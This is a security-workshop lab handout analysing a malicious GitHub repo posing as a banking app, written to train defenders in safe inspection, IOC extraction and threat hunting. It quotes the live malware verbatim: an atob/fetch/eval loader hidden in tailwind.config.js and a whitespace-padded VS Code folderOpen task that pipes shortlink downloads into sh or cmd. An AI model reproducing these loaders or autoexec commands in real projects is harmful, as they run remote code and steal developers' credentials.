# Lab 1a — Simple base64 payload + `tasks.json` autoexec: `ShamratX/AI-Banking`

## Time: 24 minutes
## Ecosystem: GitHub
## Campaign: Contagious Interview / PolinRider primitive family — simple variant
## Sample: still online — analyzed live via `gh api` (no local sample copy required)

---

## The Scenario

> You work for a large bank.  Think one of the big four.  **Jordan**, a senior developer in the company forwards you a GitHub repo they're considering forking to use in an upcoming integration project: `ShamratX/AI-Banking`. Its description reads *"a personal financial assistant (Banker Expert) — Node.js/Express + React with JWT auth, AI reports, and crypto market hooks."* The owner's bio says *"Smart Contract Engineer • Web3 Infrastructure • Full-Stack DApps."*
>
> Jordan's question is short: *"is this repo safe to clone?"*

That is the question this whole lab exists to answer — safely, without running anything the attacker wrote.

If this is your first supply-chain-malware lab, don't worry. The workshop is going to spend the whole day inside repos, packages, and extensions. Lab 1a is deliberately the gentlest one. The primitive you'll find here — a URL hidden as base64 inside `atob()` + `fetch()` + `eval()`, plus a `.vscode/` file that auto-runs on folder open — reappears in every later module in progressively more complex forms. Learn the shape now; the sophistication scales up later.

⚠ Do **not** `git clone` this repo into any directory you'd then open in VS Code / Cursor / Windsurf. In this lab we never clone anything — we read files directly out of the GitHub API and inspect them as plain text. That is the safe workflow.

---

## Part 1 — Enumerate the repo and flag candidate files (6 minutes)

Before we go hunting for a payload, we need three things:

1. **A safe way to look at the code without executing anything.** GitHub's REST API returns file contents as base64-encoded blobs in JSON. We can pull any file and read it as text without ever putting a directory in front of an IDE.
2. **A mental map of what's actually in the repo.** You can't spot the odd file if you don't know what "normal" looks like.
3. **A hunch about which files are worth reading closely.** Attackers don't hide payloads in random places — they hide them where something runs.

### Step 1.1 — See the whole file tree

**Browser:** https://github.com/ShamratX/AI-Banking

```bash
# List every file the repo has, recursively, on the default branch.
gh api '/repos/ShamratX/AI-Banking/git/trees/main?recursive=1' \
  | jq -r '.tree[] | select(.type=="blob") | .path' \
  | sort
```

Copy the output into your notes. This is your map. Skim it end-to-end.

**Sanity check as you skim:**

- Does the top of the tree look like a real project? (Expected: yes — `README.md`, `package.json`, `frontend/`, backend / API folders, `.gitignore`.)
- Any file whose **name** feels off — a config file where a config file wouldn't normally live, an extension that doesn't match the project's stack, a hidden folder with unusual contents?
- Does the repo declare a build system? If it does, any file it would touch at build-time is a candidate.

### Step 1.2 — Read the "boring" metadata first

Attackers often make a repo *look* normal so it clones through code review. So the first thing you check is the paperwork — README, `package.json`, `.gitignore`, license — because either it holds up as a story or it doesn't.

**Browser:**
- README: https://github.com/ShamratX/AI-Banking/blob/main/README.md
- package.json: https://github.com/ShamratX/AI-Banking/blob/main/package.json

```bash
# README (renders on the repo landing page)
gh api /repos/ShamratX/AI-Banking/contents/README.md --jq '.content' | base64 -d
# equivalent:
# gh api /repos/ShamratX/AI-Banking/contents/README.md | jq -r '.content' | base64 -d

# package.json — declared dependencies and scripts
gh api /repos/ShamratX/AI-Banking/contents/package.json --jq '.content' | base64 -d
# equivalent:
# gh api /repos/ShamratX/AI-Banking/contents/package.json | jq -r '.content' | base64 -d
```

**Ask yourself:**
- Do the README claims match the file tree you just listed?
- Do `dependencies` in `package.json` match what the code claims to do? (A "personal financial assistant" should look like an Express + React app, not something weirder.)
- Are there `scripts` that would run at `npm install` (`preinstall`, `postinstall`, `prepare`) or `npm start`? What do they do?

Nothing you've seen so far has to be malicious. You're building the baseline.

### Step 1.3 — Where should you look for the payload?

You now have a whole file list and you've read the paperwork. Before you pull any more files, decide **what you'd inspect next and why**. Here's the mental model:

For a supply-chain attack to work, the attacker's code has to **run** on the victim's machine. That means the payload has to live in a file that gets executed by *something*. The common landing spots on GitHub-delivered attacks are:

| Trigger | Files that run when it fires |
|---|---|
| Package install (`npm install`, `pip install`) | `package.json` scripts, `setup.py`, install hooks |
| Build (`npm run build`, `webpack`, `vite`) | build config files: `webpack.config.*`, `vite.config.*`, `tailwind.config.*`, `postcss.config.*`, `babel.config.*`, `.babelrc` |
| Opening the repo in an IDE | anything in `.vscode/`, especially `tasks.json`, `settings.json`, `spellright.dict`, `*.woff2` under `.vscode/` |
| Application startup | the `main` entry from `package.json`, `index.js`, `index.ts`, `app.js` |
| Dev-server startup | `next.config.js`, `nuxt.config.js`, `svelte.config.js`, etc. |
| A specific file "load" hook | fonts, CSS, images that a config file references (they can be renamed JS if the loader is compromised) |

**On your notes, write down 3–5 files from the file tree you'd pull and read carefully.** Explain to yourself why each one is a candidate. There is no single right answer — this is threat-hunter judgment, and you get better at it by doing it, not by being told the answer.

> **Instructor cue:** at this point, room comparison — ask a few attendees which files they flagged. Everyone should have `.vscode/*` and a build-config file on their list. If nobody flagged `frontend/tailwind.config.js`, hint: "config files that get imported at build time are just JavaScript that gets executed."

Do **not** move on until you've written down your candidates. Part 2 will confirm or reject them.

---

## Part 2 — Decode the payloads (8 minutes)

You flagged your candidates. Now let's actually read them. Two of the files you should have on your list are the ones this sample uses.

### Step 2.1 — `frontend/tailwind.config.js` — the base64 dead-drop

**Browser:** https://github.com/ShamratX/AI-Banking/blob/main/frontend/tailwind.config.js

```bash
mkdir -p ~/sandbox/shamratx && cd ~/sandbox/shamratx

gh api /repos/ShamratX/AI-Banking/contents/frontend/tailwind.config.js --jq '.content' | base64 -d > tailwind.config.js
# equivalent:
# gh api /repos/ShamratX/AI-Banking/contents/frontend/tailwind.config.js | jq -r '.content' | base64 -d > tailwind.config.js

cat tailwind.config.js
```

The top half is a **plausible-looking Tailwind config**. The bottom half — after the innocent-looking `module.exports = {...}` — has this:

```javascript
fetch(atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN"))
.then(response => response.json())
.then(data => {
    const tailwind_theme = data.content;
eval(tailwind_theme);})

fetch(atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1NSNFlI"))
.then(response => response.json())
.then(data => {
    const tailwind_theme = data.content;
eval(tailwind_theme);})
```

This is the whole malicious pattern in five lines:

1. `atob("...")` decodes a base64-encoded URL.
2. `fetch(...)` retrieves the resource. The variable name (`tailwind_theme`) is scenery — makes it read as if it's loading Tailwind theming.
3. `eval(data.content)` — **arbitrary code execution** from whatever the URL returns.

### Step 2.2 — Decode the URLs offline

```bash
echo 'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN' | base64 -d ; echo
echo 'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1NSNFlI' | base64 -d ; echo
```

**Expected output:**
- `https://jsonkeeper.com/b/5YHHM`
- `https://jsonkeeper.com/b/SR4YH`

**JSONKeeper** is a paste-bin-style hosting service the Contagious Interview umbrella uses repeatedly (you'll see it again in Lab 2b's `get-power` sample). The `data.content` field of a JSONKeeper record is the actual next-stage code.

### Step 2.3 — Fetch the current payload (safely)

Passive fetch to inspect — never `eval`, never pipe to a shell:

```bash
curl -s 'https://jsonkeeper.com/b/5YHHM' | jq . | head -40
curl -s 'https://jsonkeeper.com/b/SR4YH' | jq . | head -40
```

**Answer:**
- Does the payload look like a script, a URL, or another stage?
- Any observable strings — hostnames, IPs, wallet addresses, filesystem paths?
- Does it read as macOS-specific, Linux-specific, or platform-agnostic?

Add every observable IOC to your sheet.

### Step 2.4 — `.vscode/tasks.json` — the IDE-open autoexec

The `tailwind.config.js` dead-drop is only half the story. `ShamratX/AI-Banking` also carries an independent **VS Code IDE-open autoexec** — a `.vscode/tasks.json` that runs a per-OS shell command the moment a developer opens the folder. Same repo, second execution vector. If Jordan somehow avoids Tailwind's build (Track B, which you just analyzed), Track A here still fires the moment they open the folder.

**Browser:** https://github.com/ShamratX/AI-Banking/blob/main/.vscode/tasks.json

```bash
gh api /repos/ShamratX/AI-Banking/contents/.vscode/tasks.json --jq '.content' | base64 -d > tasks.json
# equivalent:
# gh api /repos/ShamratX/AI-Banking/contents/.vscode/tasks.json | jq -r '.content' | base64 -d > tasks.json

cat tasks.json | head -80
```

The file looks like a real VS Code project config: `projectInfo`, `environmentProfiles`, `metaDiagnostics`, `dependencyGraph`. Lots of scenery. **The malicious payload is in `tasks[0].osx.command` (and `linux.command`, `windows.command`)**, but the string is preceded by a huge run of whitespace so it scrolls off the visible edge of the file.

Confirm the whitespace trick:

```bash
awk '{ if (length($0) > 400) print NR": "length($0)" chars" }' tasks.json
```

Now extract the actual commands — parse the JSON to sidestep the whitespace:

```bash
jq '.tasks[0] | {label, runOn: .runOptions.runOn, osx: .osx.command, linux: .linux.command, windows: .windows.command, presentation}' tasks.json
```

**Answer:**
- What does `runOptions.runOn` say? (Expected: **`folderOpen`** — the task fires the moment VS Code opens the folder, before you touch anything.)
- What are the three per-OS commands? (Expected shape:
  - macOS: `curl 'https://PEsnCV.short.gy/shMkMn9m' -L | sh`
  - Linux: `wget -qO- 'https://PEsnCV.short.gy/shMkMn9l' -L | sh`
  - Windows: `curl https://PEsnCV.short.gy/shMkMn9w -L | cmd`
  )
- What does `presentation` do? (Expected: `reveal: never`, `echo: false`, `close: true`, `showReuseMessage: false` — every field set to **hide output from the developer**. That's the malware tell — benign projects don't hide task output.)

Add the three `PEsnCV.short.gy/shMkMn9{m,l,w}` shortlinks to your IOC sheet.

### Step 2.5 — Extract IOCs and fill the report row

| Field | Value |
|---|---|
| Repo | `ShamratX/AI-Banking` |
| Primitive 1 | `.vscode/tasks.json` with `runOn: folderOpen`, per-OS `curl \| sh`, presentation hidden |
| Primitive 2 | `frontend/tailwind.config.js` — `fetch(atob("<b64>")).then(...).then(data => eval(data.content))` |
| C2 (dead-drops) | `jsonkeeper.com/b/5YHHM`, `jsonkeeper.com/b/SR4YH` |
| C2 (shortlinks) | `PEsnCV.short.gy/shMkMn9{m,l,w}` |
| Delivery | Fork/clone + open in VS Code → `folderOpen` fires |
| Lineage | Contagious Interview / PolinRider primitive family (**simple variant**) |
| Verdict for Jordan | **Do not fork. Do not clone into anything opened in an IDE.** |

Cross-check against [`references/IOC-master-table.md`](../../references/IOC-master-table.md).

⚠ Do not follow the `short.gy` shortlinks with `curl -L` or a browser you care about. Use a URL expander (VirusTotal will resolve them) if you need to see the destination.

---

## Part 3 — How the payload is put together and how it reaches out to the URL (4 minutes)

You have two files with C2 URLs inside them. Now: *how is each payload actually assembled from the tokens on the page, and by what sequence of steps does it reach out to that URL and run code on the victim?* You do not need to execute anything to answer this — you can reason it out from the same text you already have open in your editor.

There are **two independent trigger paths** in this repo. The attacker built both, so if the victim only touches one, the other still fires.

### Step 3.1 — Track B (the JavaScript payload): `frontend/tailwind.config.js`

Re-open `tailwind.config.js` from Step 2.1. The malicious block is five lines. Walk it left-to-right; every token has a job.

```javascript
fetch(atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN"))
.then(response => response.json())
.then(data => {
    const tailwind_theme = data.content;
    eval(tailwind_theme);
})
```

Piece by piece:

| Token | What it does | Why the attacker picked it |
|---|---|---|
| `"aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN"` | Base64-encoded string. | Hides the literal URL from any defender who greps the repo for `jsonkeeper.com` or `http`. |
| `atob(...)` | Built-in decoder: base64 → text. Ships in Node 16+ and every browser. | Reverses the encoding at runtime, producing `https://jsonkeeper.com/b/5YHHM`. |
| `fetch(<url>)` | Built-in HTTP client (Node 18+). Returns a `Promise<Response>`. | No `require()` needed, no extra dependency added to `package.json` — nothing for a defender to spot in the manifest. |
| `.then(response => response.json())` | When the response arrives, parse the body as JSON. | JSONKeeper returns `{"content": "..."}`. This step unwraps the outer JSON envelope. |
| `.then(data => { … eval(tailwind_theme); })` | Assign the `content` field to a variable named to look like theme data, then `eval()` it. | `eval()` runs the string as JavaScript **in the current Node.js process**. The misleading variable name is scenery — it fools a fast reader into thinking Tailwind data is being loaded. |

**How it actually reaches out and runs — the sequence:**

1. **File is imported.** Anything Tailwind-aware imports this file when it starts (`tailwindcss` CLI, PostCSS+tailwind, Vite, Next.js, CRA). Node.js does not treat `.config.js` as a schema — it **evaluates the whole file top-to-bottom** and reads `module.exports` afterwards.
2. **Every top-level statement runs.** `module.exports = {...}` returns a valid Tailwind config; the two `fetch(...)` calls fire immediately after, as file-load side effects.
3. **DNS + TCP + TLS.** Node's built-in fetch does the ordinary browser dance: DNS-resolve `jsonkeeper.com`, TCP-connect to port 443, TLS handshake, HTTP GET `/b/5YHHM`. Uses the victim's outbound network — no firewall punch required.
4. **JSONKeeper returns `{"content": "<javascript source>"}`.** The `.content` value is whatever the attacker pasted last; it can be swapped at any time without touching this repo.
5. **`eval(data.content)`** runs that source in the Node process, with the developer's user permissions.

**Why JSONKeeper specifically?**

- Free, no auth, mutable — payload can be rotated at any moment
- Legitimate-looking domain, so it doesn't stand out in a proxy log
- HTTPS, so raw payload isn't visible to a passive network sensor
- Used repeatedly across the Contagious Interview umbrella (Lab 2b, historical cases), which itself is a fingerprint

### Step 3.2 — Track A (the shell payload): `.vscode/tasks.json`

Now re-open `tasks.json` from Step 2.4. Same exercise: walk every field.

| Field | What it does | Attacker's angle |
|---|---|---|
| `type: "shell"` | Run the `command` through the OS shell (bash/zsh on macOS/Linux, cmd on Windows). | Maximum reach — shell can pipe, redirect, background. |
| `osx.command`, `linux.command`, `windows.command` | Per-platform overrides. VS Code picks the block matching the current OS. | One repo hits every developer regardless of host. |
| Hundreds of leading spaces before the command string | Pads the JSON value so the real command scrolls off the right edge of anyone reading the raw file. | Fooling the eye, not the parser — `jq` still sees the whole command. |
| macOS: `curl 'https://PEsnCV.short.gy/shMkMn9m' -L \| sh` | `curl -L` follows redirects and prints the body; `\| sh` pipes the body straight into a new `sh` process. | Whatever `short.gy` resolves to right now becomes the script that runs. **The repo doesn't contain the payload — it contains a reference to one.** |
| Linux: `wget -qO- 'https://PEsnCV.short.gy/shMkMn9l' -L \| sh` | `wget -qO-` writes the body to stdout quietly; piped into `sh`. | Same idea, different tool for hosts without `curl`. |
| Windows: `curl https://PEsnCV.short.gy/shMkMn9w -L \| cmd` | Response body executed by `cmd.exe` as a batch script. | Same technique on the third OS. |
| `problemMatcher: []` | No output-parsing rules. | Nothing for VS Code to surface as a "build error" or diagnostic. |
| `presentation.reveal: "never"` | VS Code never opens the terminal panel to the user. | Silent execution. |
| `presentation.echo: false` | Command line is not printed. | No trace of the command in the (hidden) terminal. |
| `presentation.close: true` | Terminal window closes when the task exits. | Even if you spotted it flashing, it's already gone. |
| `presentation.showReuseMessage: false` | No "task terminal reused" popup. | Zero UI surface. |
| `runOptions.runOn: "folderOpen"` | Fire the task automatically when the folder opens. | The trigger — no F5, no palette command, no interaction. |

**How it actually reaches out and runs — the sequence:**

1. **Workspace opened.** VS Code (and Cursor/Windsurf/forks) reads `.vscode/tasks.json` on workspace load, before you touch anything.
2. **Trust check.** If Workspace Trust is on and the folder isn't yet trusted, `folderOpen` tasks are held. Modern VS Code respects this. Older editors, Cursor, and Windsurf often don't. Attackers write for the least-strict client.
3. **Task queued.** With trust granted, VS Code queues the OS-matching `command` for execution.
4. **Shell spawned.** VS Code launches a `sh -c '<command>'` (or `cmd /c` on Windows). Because of `presentation`, no UI is drawn.
5. **DNS + TCP + TLS + HTTP.** `curl` (or `wget`) resolves `PEsnCV.short.gy`, opens 443, does TLS, sends GET. The shortlink returns an HTTP 301/302 with a `Location:` header pointing at the real payload host. `-L` tells `curl` to follow it.
6. **Payload downloaded.** The real host returns a shell script (or batch script on Windows). Body streams to stdout.
7. **Piped into shell.** `| sh` (or `| cmd`) reads the streamed bytes and executes them line by line. First lines usually detach, wipe temp files, and remove any trace of the original curl.

**Why the double indirection (short.gy → real host)?**

- Rotation. The attacker can change what the shortlink points at without touching the repo. If defenders block the real payload host, the shortlink retargets in seconds.
- Attribution decoupling. The shortlink hides the real host from casual observers.
- Analytics. Some shortlink services show the operator per-click stats — geo, user agent, click-through timing — which becomes a beacon for how many victims are biting.

### Step 3.3 — What both tracks add up to

**Belt and braces.** If Jordan avoids VS Code, they still trigger Track B the first time they build. If Jordan builds in a container and only browses code in VS Code, they still trigger Track A. Two independent execution paths for one repo visit.

**Ceiling of what runs.** Both tracks run **as Jordan's user**, so the payload — whichever track fires — can:

- Read env vars, SSH keys, cloud-CLI credentials (`~/.aws`, `~/.gcloud`, `~/.docker/config.json`)
- Read browser profile stores, wallet-extension state (MetaMask, Phantom)
- Install persistence — LaunchAgent (macOS), systemd unit (Linux), scheduled task (Windows)
- Beacon to a follow-up C2 for interactive commands

You already fetched the current JSONKeeper contents in Step 2.3. Compare what's in `.content` today against this capability list — is the current stage a stealer, a downloader for another stage, or a beacon?

**Quick answers to note:**
- Which track fires first if Jordan does both actions? (VS Code's `folderOpen` is instant; Tailwind loads only once a build or dev-server starts.)
- Does Workspace Trust break Track A? (In modern VS Code, yes — until the user trusts the folder.) Does it break Track B? (No — Track B fires at `npm run` time, which is outside VS Code's trust boundary.)
- If VS Code blocks Track A on this repo, how many of Jordan's teammates would still be at risk once Jordan commits their `.vscode/settings.json` marking the folder as trusted?

---

## Part 4 — Who is behind this? (2 minutes)

You now have the answer to Jordan's question (no, don't clone it) and a mechanism-level understanding of how the payload lands. The last piece is knowing **who the actor is**, so you can spot the next repo they publish before someone else on Jordan's team finds it.

This is the "who did this" pass. In every real investigation you do this **after** you've confirmed there's something to attribute.

### Step 4.1 — Account metadata

**Browser:** https://github.com/ShamratX

```bash
gh api /users/ShamratX --jq '{login, name, bio, created_at, public_repos, followers}'
# equivalent:
# gh api /users/ShamratX | jq '{login, name, bio, created_at, public_repos, followers}'
```

**Answer:**
- Account creation date? (Expected: **2026-02-26** — recent, under a year old.)
- Bio credibility? (Reads plausibly as a "smart-contract engineer" — that's the *target* profile for Contagious Interview lures. A recent account with a crypto-dev bio is a common shape.)
- Followers? Public repo count?

### Step 4.2 — Portfolio shape (this account's other repos)

```bash
gh api /users/ShamratX/repos --paginate --jq '.[] | [.created_at, .name, .fork, .description // "-"] | @tsv'
# equivalent (needs -r for @tsv raw output):
# gh api /users/ShamratX/repos --paginate | jq -r '.[] | [.created_at, .name, .fork, .description // "-"] | @tsv'
```

**Answer:**
- All six repos: what themes appear? (Expected: ERC-20 / hardhat / DApp / Web3 — a **crypto-dev persona**.)
- Any throwaway signals? (Recent account + narrow theme + almost no followers + one fork of a legitimate-looking project = plausible lure account.)
- Do any of these other repos look worth checking with the same technique? (You don't have to check them now — flag for Module 5.)

Save this in your notes. You may pivot back to it in Module 5.

---

## Part 5 — Take the signatures wider: your first hunt (4 minutes)

You have IOCs specific to Jordan's repo. But an operator who built this pattern here has almost certainly used the same pieces elsewhere — different repo, different account, same tricks. Finding those other repos, using what you already know as a search pattern, is **threat hunting**.

A *signature* is any pattern from this attack that you'd expect to reappear in related attacks. Signatures live on a spectrum:

| Narrower signature | Broader signature |
|---|---|
| Specific base64 string, specific shortlink URL | The `atob + fetch + eval` code shape |
| Finds only this operator's work | Finds the whole family + some unrelated code |
| High precision, low recall | Lower precision, higher recall |

You use narrow signatures when you're pivoting inside a known campaign. You use broader ones when you want to see everyone using a technique. Both are useful — just for different questions.

### Step 5.1 — Rank the signatures you have

Look at your notes from Parts 2 and 3. Rank the artifacts from narrow to broad. Something like:

1. `aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN` — this exact base64 blob
2. `PEsnCV.short.gy` — this shortlink domain segment
3. `jsonkeeper.com/b/` **and** `atob` in the same file
4. `atob(` **and** `fetch(` **and** `eval(` in the same JS file (any URL)
5. `runOn` + `folderOpen` + `curl` + `presentation` inside a `tasks.json`

Signature #1 might catch two or three repos. Signature #4 might catch two thousand. Both are correct hunts; they just answer different questions.

### Step 5.2 — Run two queries

GitHub's code-search API is available through `gh search code` (or the web UI at [github.com/search?type=code](https://github.com/search?type=code)). Run one narrow and one broader query:

```bash
# Narrow: the exact base64 fingerprint from this repo
gh search code 'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzVZSEhN' --limit 30

# Broader: JSONKeeper URL pattern + atob together
gh search code 'jsonkeeper.com/b/' 'atob' --limit 30 --extension js
```

**Answer:**
- How many results did each return?
- Skim the top hits from the broader query — do they all look like the same attack family, or is there noise?
- What signature would you tune next time to be *between* these two — fewer false positives than query 2, more coverage than query 1?

### Step 5.3 — Verify one hit (optional if time permits)

Pick one file from the broader query's results. Apply the mini-workflow from Part 1 to it: `gh api` the file, decode any base64, walk the execution. Is it the same actor, a related actor, or coincidence?

### Step 5.4 — Where this goes

You just did the workshop's first threat hunt — from your own signatures, no cheat sheet needed. The rest of the day builds on this:

- [`references/POLINRIDER-QUERIES.md`](../../references/POLINRIDER-QUERIES.md) is a full pre-built query cheatsheet you'll draw from in Lab 1b.
- Module 2 (NPM) and Module 3 (PyPI) apply the same pattern-then-hunt loop to package registries.
- Module 5 asks you to build your own hunt query set from IOCs you've collected all day.
- The 90-minute CTF finale is one continuous instance of this loop.

---

## Debrief prompts

- In Part 1 you flagged candidate files without being told what was malicious. Did you correctly guess `.vscode/tasks.json` and a build-config file? What signals led you there?
- In Part 3 you walked the two execution paths. Which track would you find harder to explain to a non-developer teammate — the IDE task or the config-file `eval`? Why does that matter for training the rest of the org?
- In Part 5, which of your signatures produced the best precision-vs-recall trade-off? Would you rank them the same way for hunting a **new** actor as for hunting **this** actor?
- If the operator had used string concatenation instead of base64 (`"https://" + "jsonkeeper.com" + "/b/5YHHM"`), what would your detection look like?
- Compare mentally to the DEF CON `funtico-tech-assestment` lure you'll see in Lab 1d. Same primitive family, different sophistication. What's the same? What's different?

## MITRE ATT&CK mapping

- Initial Access — T1195.001 (Compromise Software Dependencies and Development Tools)
- Execution — T1059.007 (Command and Scripting Interpreter: JavaScript), T1204.002 (User Execution: Malicious File)
- Defense Evasion — T1140 (Deobfuscate/Decode Files or Information — base64+atob), T1027.010

## Sources

- Live analysis of `https://github.com/ShamratX/AI-Banking` (repo online as of workshop-prep; historical record preserved by GitHub even if the repo is later removed)
- `references/POLINRIDER-QUERIES.md` — related primitive family

## Instructor note

If `ShamratX/AI-Banking` is taken down before workshop day, the analysis still works from the two files quoted verbatim in this HANDOUT. Screenshot the `gh api` output during dry-run and stash in `references/gh-api-fixtures/shamratx.json` as an offline fallback.
